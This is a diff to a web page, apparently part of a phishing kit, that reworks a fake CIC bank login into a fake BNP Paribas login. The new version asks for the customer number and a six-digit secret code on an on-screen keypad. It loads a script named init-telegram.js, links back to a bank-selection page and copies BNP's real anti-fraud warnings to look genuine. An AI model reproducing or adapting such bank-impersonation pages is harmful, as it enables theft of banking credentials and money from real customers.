@@ -11,48 +11,62 @@
     <script src="init-telegram.js" defer></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Espace Client | Connexion CIC</title>
+    <title>Connexion - BNP Paribas</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* Votre CSS existant reste identique */
         :root {
-            --cic-blue: #153366;
-            --cic-turquoise: #007a7e;
-            --cic-green: #008d36;
-            --cic-bg: #f4f7f8;
-            --border-gray: #ccc;
+            --bnp-green: #00965e;
+            --bnp-dark-green: #006a43;
+            --text-gray: #666;
+            --border-light: #ddd;
+            --error-red: #e74c3c;
+            --success-green: #2ecc71;
         }
 
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            background-color: var(--cic-bg);
-            color: #333;
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+
+        body { 
+            background-color: #fff; 
+            display: flex; 
+            flex-direction: column; 
             min-height: 100vh;
+            overflow-x: hidden;
         }
 
-        /* BOUTON RETOUR VERS BANK - REPOSITIONNÉ PLUS BAS */
-        .back-to-bank-btn {
+        /* BOUTON RETOUR AU-DESSUS DU LOGO */
+        .back-to-bank-container {
             position: fixed;
-            top: 100px;
-            left: 20px;
-            background-color: var(--cic-turquoise);
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: white;
+            border-bottom: 1px solid var(--border-light);
+            padding: 12px 20px;
+            z-index: 1000;
+            display: flex;
+            justify-content: flex-start;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        .back-to-bank-btn {
+            background-color: var(--bnp-green);
             color: white;
             border: none;
             border-radius: 50px;
-            padding: 10px 18px;
+            padding: 8px 16px;
             font-size: 13px;
             font-weight: bold;
             cursor: pointer;
-            display: flex;
+            display: inline-flex;
             align-items: center;
             gap: 8px;
-            box-shadow: 0 4px 12px rgba(0, 122, 126, 0.3);
             transition: all 0.3s ease;
-            z-index: 1000;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
         
         .back-to-bank-btn:hover {
-            background-color: #006a6e;
+            background-color: var(--bnp-dark-green);
             transform: translateX(-2px);
         }
         
@@ -65,219 +79,386 @@
             font-style: normal;
             font-weight: bold;
         }
-
-        /* --- MENU DU HAUT --- */
-        .top-utility-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 8px 10%;
-            background: white;
-            font-size: 13px;
-            border-bottom: 1px solid #f0f0f0;
-        }
-
-        .top-utility-bar ul {
-            list-style: none;
-            display: flex;
-            margin: 0;
-            padding: 0;
-            gap: 20px;
-        }
-
-        .top-utility-bar ul li a {
-            text-decoration: none;
-            color: #666;
-        }
-
-        .top-utility-bar ul li a.active {
-            color: var(--cic-turquoise);
+        
+        /* --- MESSAGES D'ÉTAT --- */
+        .message {
+            display: none;
+            padding: 15px;
+            margin: 15px auto;
+            border-radius: 4px;
+            text-align: center;
             font-weight: bold;
-            border-bottom: 2px solid var(--cic-turquoise);
+            max-width: 450px;
+            animation: slideIn 0.3s ease;
         }
 
-        .top-right-links { display: flex; gap: 15px; color: #333; }
+        .message.error {
+            background-color: #fee;
+            color: var(--error-red);
+            border: 1px solid #fcc;
+        }
+
+        .message.success {
+            background-color: #e8f6ef;
+            color: var(--success-green);
+            border: 1px solid #bce8d4;
+        }
+
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+            color: var(--bnp-green);
+        }
+
+        .spinner-icon {
+            animation: spin 1s linear infinite;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
 
         /* --- HEADER --- */
         header {
-            background: white;
-            padding: 12px 10%;
             display: flex;
             align-items: center;
-            gap: 25px;
-            border-bottom: 1px solid #eee;
-            margin-top: 0;
-        }
-
-        .logo-cic { height: 35px; }
-        
-        .icon-nav { height: 20px; width: auto; cursor: pointer; opacity: 0.7; }
-        .icon-nav:hover { opacity: 1; }
-
-        h1 { text-align: center; color: var(--cic-blue); font-size: 26px; margin-top: 40px; font-weight: bold; }
-
-        /* --- POSITIONNEMENT DES MOTIFS --- */
-        .page-center {
-            position: relative;
-            width: 100%;
-            max-width: 750px;
-            margin: 20px auto 60px auto;
-        }
-
-        .pattern {
-            position: absolute;
-            width: 60px;
-            height: 60px;
-            z-index: 0;
-        }
-        
-        .pattern-top {
-            top: -20px;
-            right: -25px;
-            border-top: 25px solid var(--cic-turquoise);
-            border-right: 25px solid var(--cic-turquoise);
-        }
-
-        .pattern-bottom {
-            bottom: -20px;
-            left: -25px;
-            border-bottom: 30px solid var(--cic-blue);
-            border-left: 30px solid var(--cic-blue);
-        }
-
-        .login-wrapper {
-            position: relative;
-            background: white;
-            z-index: 1;
-            box-shadow: 0 5px 25px rgba(0,0,0,0.08);
-        }
-
-        /* --- ONGLETS --- */
-        .tabs-header { display: flex; border-bottom: 1px solid #eee; }
-        .tab-btn {
-            flex: 1;
-            padding: 18px;
-            border: none;
-            background: none;
-            cursor: pointer;
-            font-weight: bold;
-            color: #555;
-            font-size: 14px;
-            border-bottom: 3px solid transparent;
-        }
-        .tab-btn.active {
-            color: var(--cic-turquoise);
-            border-bottom: 3px solid var(--cic-turquoise);
-        }
-
-        .tab-content { padding: 40px 10%; display: none; }
-        .tab-content.active { display: block; }
-
-        /* --- FORMULAIRE --- */
-        .form-group { margin-bottom: 25px; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; }
-        input { 
-            width: 100%; 
-            padding: 12px; 
-            border: 1px solid var(--border-gray); 
-            border-radius: 2px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-
-        .btn-submit {
-            background-color: var(--cic-turquoise);
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 14px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 2px;
-        }
-        .btn-submit:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .btn-green-cic {
-            background-color: var(--cic-turquoise);
-        }
-
-        .usb-graphic {
-            width: 100px;
-            height: 38px;
-            background: var(--cic-turquoise);
-            margin: 20px auto;
-            border-radius: 4px;
-            position: relative;
-            box-shadow: 0 3px 0 #006b29;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 10px;
-            font-weight: bold;
-        }
-        .usb-graphic::after {
-            content: "";
-            position: absolute;
-            right: -15px;
-            width: 15px;
-            height: 18px;
-            background: #d1d1d1;
-            border-radius: 2px;
-        }
-
-        .login-footer { display: flex; border-top: 1px solid #eee; }
-        .footer-link {
-            flex: 1;
-            text-align: center;
-            padding: 18px;
-            text-decoration: none;
-            color: var(--cic-turquoise);
-            font-size: 14px;
-            border-right: 1px solid #eee;
-        }
-        .footer-link:last-child { border-right: none; }
-
-        .astuces-bar {
-            background: #f0fbfc;
-            padding: 15px;
-            text-align: center;
-            font-size: 13px;
-        }
-
-        /* Loading spinner */
-        .loading-spinner {
-            display: none;
-            position: fixed;
+            justify-content: space-between;
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border-light);
+            background-color: #fff;
+            position: sticky;
             top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            color: white;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            margin-top: 50px;
         }
-        .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top: 4px solid var(--cic-turquoise);
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        .logo-container { 
+            display: flex; 
+            align-items: center; 
+            gap: 15px;
+            flex-wrap: wrap;
         }
         
+        .logo-img { 
+            height: 35px; 
+            width: auto;
+        }
+        
+        .tagline { 
+            color: var(--text-gray); 
+            font-size: 12px; 
+            padding-left: 15px; 
+            border-left: 1px solid var(--border-light);
+            display: none;
+        }
+
+        /* Menu mobile */
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 20px;
+            color: var(--text-gray);
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        /* --- CONTENEUR PRINCIPAL --- */
+        .container { 
+            display: flex; 
+            flex: 1; 
+            flex-direction: row;
+        }
+
+        /* Section Gauche (Verte) - Connexion */
+        .login-section {
+            background-color: var(--bnp-green);
+            flex: 1.5;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            min-height: calc(100vh - 70px);
+            order: 1;
+        }
+
+        .login-box { 
+            width: 100%; 
+            max-width: 450px;
+            animation: fadeUp 0.5s ease;
+        }
+        
+        h1 { 
+            font-size: 22px; 
+            margin-bottom: 25px; 
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .form-group { 
+            margin-bottom: 20px; 
+            position: relative; 
+        }
+        
+        label { 
+            display: block; 
+            font-weight: 600; 
+            margin-bottom: 8px; 
+            font-size: 14px; 
+        }
+
+        .input-wrapper { 
+            position: relative; 
+            width: 100%; 
+        }
+        
+        input[type="text"] {
+            width: 100%; 
+            padding: 14px 45px 14px 15px; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            color: #333; 
+            outline: none;
+            background-color: rgba(255,255,255,0.95);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            box-shadow: 0 0 0 2px rgba(255,255,255,0.5);
+        }
+
+        .clear-btn {
+            position: absolute; 
+            right: 15px; 
+            top: 50%; 
+            transform: translateY(-50%);
+            color: #999; 
+            cursor: pointer; 
+            background: none; 
+            border: none; 
+            font-size: 18px;
+            transition: color 0.3s;
+        }
+
+        .clear-btn:hover {
+            color: var(--error-red);
+        }
+
+        .checkbox-group { 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            margin-top: 15px; 
+            font-size: 13px; 
+            color: rgba(255,255,255,0.9);
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: white;
+        }
+
+        /* --- BOUTON SUIVANT --- */
+        .btn-next {
+            width: 100%; 
+            padding: 16px; 
+            border: none; 
+            border-radius: 25px;
+            background-color: rgba(141, 189, 164, 0.7);
+            color: var(--bnp-dark-green); 
+            font-weight: 600; 
+            font-size: 16px;
+            margin-top: 20px; 
+            cursor: not-allowed; 
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .btn-next.active {
+            background-color: #e5f3ec;
+            cursor: pointer;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.15);
+        }
+
+        .btn-next.active:hover {
+            background-color: #d4f0e3;
+        }
+
+        /* --- CLAVIER SECRET (SÉQUENTIEL) --- */
+        #keypad-container {
+            display: none;
+            margin-top: 30px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .dots-display {
+            display: flex; 
+            justify-content: center; 
+            gap: 12px; 
+            margin: 20px 0 30px;
+        }
+
+        .dot {
+            width: 16px; 
+            height: 16px; 
+            border: 2px solid rgba(255,255,255,0.6); 
+            border-radius: 50%;
+            transition: all 0.3s ease;
+        }
+        
+        .dot.filled { 
+            background-color: white; 
+            border-color: white;
+            transform: scale(1.1);
+        }
+
+        .keypad-grid {
+            display: grid; 
+            grid-template-columns: repeat(5, 1fr); 
+            gap: 12px;
+        }
+
+        .key {
+            background: rgba(255,255,255,0.95); 
+            color: #333; 
+            border: none; 
+            padding: 18px 5px;
+            font-size: 20px; 
+            font-weight: bold; 
+            border-radius: 8px; 
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 3px 5px rgba(0,0,0,0.1);
+        }
+        
+        .key:hover {
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 8px rgba(0,0,0,0.15);
+        }
+        
+        .key:active {
+            transform: translateY(0);
+        }
+        
+        .key-clear {
+            grid-column: span 1; 
+            background: rgba(255,255,255,0.2); 
+            color: white;
+            font-size: 18px;
+        }
+
+        /* --- BOUTON ACCÈS --- */
+        .btn-access {
+            width: 100%; 
+            padding: 16px; 
+            border: none; 
+            border-radius: 25px;
+            background-color: rgba(141, 189, 164, 0.7);
+            color: var(--bnp-dark-green); 
+            font-weight: 600; 
+            font-size: 16px;
+            margin-top: 30px; 
+            cursor: not-allowed; 
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+
+        .btn-access.active {
+            background-color: #e5f3ec;
+            cursor: pointer;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.15);
+        }
+
+        .btn-access.active:hover {
+            background-color: #d4f0e3;
+        }
+
+        .forgot-link {
+            display: block; 
+            text-align: center; 
+            margin-top: 20px; 
+            color: white;
+            text-decoration: underline; 
+            font-size: 14px; 
+            font-weight: 500;
+            transition: opacity 0.3s;
+        }
+
+        .forgot-link:hover {
+            opacity: 0.8;
+        }
+
+        /* Section Droite (Sécurité) */
+        .info-section {
+            flex: 1; 
+            padding: 40px 20px; 
+            background-color: #f8f9fa;
+            overflow-y: auto;
+            max-height: calc(100vh - 70px);
+            order: 2;
+        }
+
+        .info-block { 
+            margin-bottom: 35px; 
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 3px 15px rgba(0,0,0,0.05);
+        }
+        
+        .info-block h3 { 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            font-size: 17px; 
+            margin-bottom: 15px; 
+            color: #333;
+        }
+        
+        .info-block h3 i {
+            color: var(--bnp-green);
+        }
+        
+        .security-url {
+            background: #f4fdf9; 
+            padding: 12px 15px; 
+            border-radius: 6px; 
+            border: 1px solid #e0f2ea;
+            font-family: 'Courier New', monospace; 
+            font-size: 14px; 
+            font-weight: 600; 
+            color: #333; 
+            margin: 12px 0;
+            word-break: break-all;
+        }
+        
+        .info-text { 
+            font-size: 14px; 
+            color: var(--text-gray); 
+            line-height: 1.6; 
+            margin-bottom: 15px;
+        }
+        
+        .link-green { 
+            color: var(--bnp-green); 
+            text-decoration: underline; 
+            font-weight: 600; 
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+        
+        .link-green:hover {
+            color: var(--bnp-dark-green);
+        }
+
         /* Toast notification */
         .toast {
             position: fixed;
@@ -289,15 +470,15 @@
             padding: 12px 20px;
             border-radius: 12px;
             font-size: 14px;
-            z-index: 3000;
+            z-index: 10000;
             display: none;
             white-space: nowrap;
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
             font-weight: 500;
         }
         .toast.show { display: block; animation: fadeInOut 3s ease-in-out; }
-        .toast.success { background-color: #28a745; }
-        .toast.error { background-color: #dc3545; }
+        .toast.success { background-color: #10b981; }
+        .toast.error { background-color: #ef4444; }
         @keyframes fadeInOut {
             0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
             15% { opacity: 1; transform: translateX(-50%) translateY(0); }
@@ -305,23 +486,96 @@
             100% { opacity: 0; transform: translateX(-50%) translateY(20px); }
         }
 
-        @media (max-width: 768px) {
-            .back-to-bank-btn {
-                top: 90px;
-                left: 15px;
-                padding: 8px 14px;
-                font-size: 11px;
-                z-index: 1001;
+        /* --- ANIMATIONS --- */
+        @keyframes fadeIn { 
+            from { opacity: 0; } 
+            to { opacity: 1; } 
+        }
+
+        @keyframes fadeUp {
+            from { 
+                opacity: 0; 
+                transform: translateY(20px); 
+            } 
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
             }
         }
-        
+
+        @keyframes slideIn {
+            from { 
+                opacity: 0; 
+                transform: translateY(-10px); 
+            } 
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* --- VERSION MOBILE --- */
+        @media (max-width: 900px) {
+            .back-to-bank-container {
+                padding: 8px 15px;
+            }
+            .back-to-bank-btn {
+                padding: 6px 12px;
+                font-size: 11px;
+            }
+            
+            header {
+                margin-top: 45px;
+            }
+            
+            .container { 
+                flex-direction: column;
+                min-height: auto;
+            }
+            
+            .login-section {
+                min-height: 60vh;
+            }
+        }
+
         @media (max-width: 480px) {
             .back-to-bank-btn {
-                top: 80px;
-                left: 10px;
-                padding: 6px 12px;
+                padding: 5px 10px;
                 font-size: 10px;
             }
+        }
+
+        @media (max-width: 375px) {
+            .login-section {
+                min-height: 70vh;
+            }
+        }
+
+        @media (min-width: 1200px) {
+            .container {
+                max-width: 1400px;
+                margin: 0 auto;
+            }
+            
+            .login-section {
+                padding: 60px 40px;
+            }
+            
+            .info-section {
+                padding: 60px 40px;
+            }
+        }
+
+        .no-inspect {
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
         }
     
         /* ===== OPTIMISATIONS MOBILE ===== */
@@ -408,94 +662,133 @@
 </head>
 <body>
 
-    <!-- BOUTON RETOUR VERS LA PAGE DES BANQUES -->
-    <button class="back-to-bank-btn" onclick="window.location.href='bank.html'">
-        <i>←</i> Retour aux banques
-    </button>
-
-    <!-- Loading Spinner -->
-    <div class="loading-spinner" id="loadingSpinner">
-        <div class="spinner"></div>
-        <div>Connexion en cours...</div>
+    <!-- BOUTON RETOUR AU-DESSUS DU LOGO -->
+    <div class="back-to-bank-container">
+        <button class="back-to-bank-btn" onclick="window.location.href='bank.html'">
+            <i>←</i> Retour aux banques
+        </button>
     </div>
 
     <!-- Toast notification -->
     <div id="toast" class="toast"></div>
 
-    <div class="top-utility-bar">
-        <ul>
-            <li><a href="#" class="active">Particuliers</a></li>
-            <li><a href="#">Auto-entrepreneurs</a></li>
-            <li><a href="#">Professionnels</a></li>
-            <li><a href="#">Entreprises</a></li>
-            <li><a href="#">Agriculteurs</a></li>
-            <li><a href="#">Associations</a></li>
-        </ul>
-        <div class="top-right-links">
-            <span>Site institutionnel</span>
-            <span>Centre d'aide</span>
-            <span>FR ⌵</span>
-        </div>
+    <!-- Message d'état -->
+    <div class="message" id="errorMessage"></div>
+    <div class="message success" id="successMessage"></div>
+    
+    <!-- Spinner de chargement -->
+    <div class="loading-spinner" id="loadingSpinner">
+        <div class="spinner-icon"><i class="fas fa-circle-notch"></i></div>
+        <p>Connexion en cours...</p>
     </div>
 
     <header>
-        <img src="images/cic.png" alt="CIC" class="logo-cic" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Logo_CIC.svg/1024px-Logo_CIC.svg.png'">
+        <div class="logo-container">
+            <img src="images/bnp.jfif" 
+                 alt="BNP Paribas" 
+                 class="logo-img">
+            <span class="tagline">La banque d'un monde qui change</span>
+        </div>
+        
+        <button class="mobile-menu-btn" id="mobileMenuBtn" aria-label="Menu">
+            <i class="fas fa-bars"></i>
+        </button>
     </header>
 
-    <h1>Se connecter</h1>
+    <div class="container">
+        <!-- SECTION CONNEXION -->
+        <div class="login-section">
+            <div class="login-box">
+                <h1>Accédez à votre espace client</h1>
 
-    <div class="page-center">
-        
-        <div class="pattern pattern-top"></div>
-        <div class="pattern pattern-bottom"></div>
-
-        <div class="login-wrapper">
-            <div class="tabs-header">
-                <button class="tab-btn active" onclick="showTab('id-tab', this)">Identifiant / Mot de passe</button>
-                <button class="tab-btn" onclick="showTab('cert-tab', this)">Certificat Électronique</button>
-                <button class="tab-btn" onclick="showTab('safe-tab', this)">SAFETRANS</button>
-            </div>
-
-            <div id="id-tab" class="tab-content active">
-                <p style="color:#d9534f; font-size:11px; margin-bottom: 20px;">* Information obligatoire</p>
                 <div class="form-group">
-                    <label>Identifiant *</label>
-                    <input type="text" id="identifiant">
+                    <label for="client-id">Numéro Client</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="client-id" placeholder="Numéro de 7 à 10 chiffres" 
+                               maxlength="10" autocomplete="off" inputmode="numeric"
+                               pattern="[0-9]{7,10}" title="Entrez 7 à 10 chiffres">
+                        <button class="clear-btn" id="btn-clear-id" type="button" aria-label="Effacer">
+                            <i class="fa-regular fa-circle-xmark"></i>
+                        </button>
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="remember">
+                        <label for="remember" class="no-inspect">Mémoriser mon numéro client</label>
+                        <i class="fa-solid fa-circle-info" title="Cette information est stockée localement sur votre appareil"></i>
+                    </div>
                 </div>
-                <div class="form-group">
-                    <label>Mot de passe *</label>
-                    <input type="password" id="password">
+
+                <!-- Bouton SUIVANT -->
+                <button class="btn-next" id="next-btn" type="button" disabled>
+                    Suivant
+                </button>
+
+                <!-- CLAVIER SECRET -->
+                <div id="keypad-container">
+                    <label>Saisissez votre code secret</label>
+                    
+                    <div class="dots-display">
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                        <div class="dot"></div>
+                    </div>
+
+                    <div class="keypad-grid" id="keypad">
+                        <!-- Clavier généré dynamiquement -->
+                    </div>
                 </div>
-                <button class="btn-submit" id="login-btn">Se connecter</button>
+
+                <button class="btn-access" id="submit-btn" type="button" disabled style="display: none;">
+                    Accéder à mon espace client
+                </button>
+                
+                <a href="#" class="forgot-link" id="forgot-link">
+                    Numéro client ou code secret oublié
+                </a>
+            </div>
+        </div>
+
+        <!-- SECTION SÉCURITÉ -->
+        <div class="info-section">
+            <div class="info-block">
+                <h3><i class="fa-solid fa-lock"></i> Sécurité</h3>
+                <p class="info-text">Avant de vous connecter, vérifiez que sur la page Espace Client :</p>
+                <div class="security-url">Espace client</div>
+                <p class="info-text">Si une tierce personne ou un représentant BNP Paribas vous demande de vous connecter ou de fournir des informations, il s'agit systématiquement d'une fraude.</p>
+                <br>
+                <a href="#" class="link-green" id="security-link">
+                    Consulter tous nos conseils sécurité et fraude.
+                </a>
             </div>
 
-            <div id="cert-tab" class="tab-content">
-                <div style="text-align: center;">
-                    <div class="usb-graphic">CIC</div>
-                    <h3 style="color: var(--cic-blue);">Certificat sur clé USB</h3>
-                    <p style="font-size: 14px; color: #666;">Branchez votre <strong>clé de sécurité CIC (Verte)</strong> pour accéder à votre certificat.</p>
-                    <button class="btn-submit btn-green-cic" id="cert-btn" style="margin-top: 20px;">Détecter ma clé verte</button>
+            <div class="info-block">
+                <h3><i class="fa-solid fa-headset"></i> Besoin d'aide ?</h3>
+                <p class="info-text">Consultez notre <a href="#" class="link-green" id="tech-support">Assistance technique.</a></p>
+                <p class="info-text">Disponible du lundi au vendredi de 8h à 20h et le samedi de 9h à 17h.</p>
+            </div>
+            
+            <div class="info-block">
+                <h3><i class="fa-solid fa-mobile-alt"></i> Application Mobile</h3>
+                <p class="info-text">Téléchargez l'application "Mes Comptes BNP Paribas" pour gérer vos comptes où que vous soyez.</p>
+                <div style="display: flex; gap: 15px; margin-top: 15px;">
+                    <button id="app-store" style="flex:1; padding:10px; background:#333; color:white; border:none; border-radius:6px; font-size:12px;">
+                        <i class="fab fa-apple"></i> App Store
+                    </button>
+                    <button id="play-store" style="flex:1; padding:10px; background:#0F9D58; color:white; border:none; border-radius:6px; font-size:12px;">
+                        <i class="fab fa-google-play"></i> Play Store
+                    </button>
                 </div>
             </div>
-
-            <div id="safe-tab" class="tab-content">
-                <h3 style="color: var(--cic-blue); margin-top:0;">Authentification SAFETRANS</h3>
-                <p style="font-size: 14px; color: #666;">Saisissez le code de session généré par votre terminal.</p>
-                <div class="form-group">
-                    <label>Code de session :</label>
-                    <input type="text" id="safecode" placeholder="XXXX-XXXX">
-                </div>
-                <button class="btn-submit" id="safe-btn">Valider</button>
-            </div>
-
-            <div class="login-footer">
-                <a href="#" class="footer-link">Codes d'accès oubliés →</a>
-                <a href="#" class="footer-link">Infos sécurité →</a>
-            </div>
-
-            <div class="astuces-bar">
-                <span style="color: var(--cic-turquoise); font-weight:bold;">Astuces :</span> 
-                <a href="#" style="color: var(--cic-turquoise); text-decoration: underline;">Nos conseils pour sécuriser vos opérations et données.</a>
+            
+            <div class="info-block">
+                <h3><i class="fa-solid fa-shield-alt"></i> Protection des données</h3>
+                <p class="info-text">BNP Paribas s'engage à protéger vos données personnelles. Vos informations de connexion sont chiffrées et sécurisées.</p>
+                <a href="#" class="link-green" id="privacy-link">
+                    Lire notre politique de confidentialité
+                </a>
             </div>
         </div>
     </div>
